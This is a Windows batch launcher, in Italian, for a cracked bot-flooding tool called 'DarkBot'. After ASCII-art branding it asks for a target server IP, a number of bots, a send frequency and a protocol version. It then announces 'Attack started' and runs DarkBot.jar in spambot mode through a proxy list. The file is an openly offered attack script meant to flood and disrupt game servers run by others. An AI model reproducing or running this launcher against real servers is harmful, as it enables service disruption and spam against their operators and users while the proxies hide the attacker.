@echo off
title DarkBot - Cracked by Mr_Default_
color 00
echo ---------/\-------------------/\--------       ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
echo ---------\/\-----------------/\/--------       Cracked by Mr_default_
echo ----------\/\----/\---/\----/\/---------       ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
echo -----------\/\--/-/---\-\--/\/----------
echo ------------\/\/-/-----\-\/\/-----------
echo -------------\/-/\-----/\-\/------------
echo -------------/-/\-\---/-/\-\------------
echo ------------/-/\\\-\-/-///\-\-----------
echo -----------/-/\\\\\-\-/////\-\----------                              
echo -----------\/--\\\\\-\////--\/----------
echo -----------DarkBot by angeloxl----------
echo --Cracked by Mr_default_-------------
echo --------------/-//\\\\\-\---------------
echo -------------/-////\\\\\-\--------------
echo ------------/-/////-\\\\\-\-------------
echo -----------/-/////---\\\\\-\------------
echo ----------/-/////-----\\\\\-\-----------
echo ---------/-/////-------\\\\\-\----------
echo --------/-/////---------\\\\\-\---------
echo -------/-/////-----------\\\\\-\--------
echo -------\/////-------------\\\\\/--------
echo --------\///---------------\\\/---------
echo ---------\/-----------------\/----------
echo.
set /p x=Nome owner (angeloxl): 
echo.
echo.ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
echo.
set /p m=Numero dei Bots: 
echo.
echo.ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
echo.
set /p n=Ip server: 
echo.
echo.ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
echo.
set /p v=Frequenza (ms): 
echo.
echo.ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
echo.
set /p z=Protocollo (4,5,61,74,78): 
echo.
echo.ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
echo Attacco Partito!
echo.
echo.
:WCHODZ
cd c:\
java -jar DarkBot.jar -t spambot -O -o %x% -b %m% -s %n% --protocol %z% -d %v% --http-proxy proxy.txt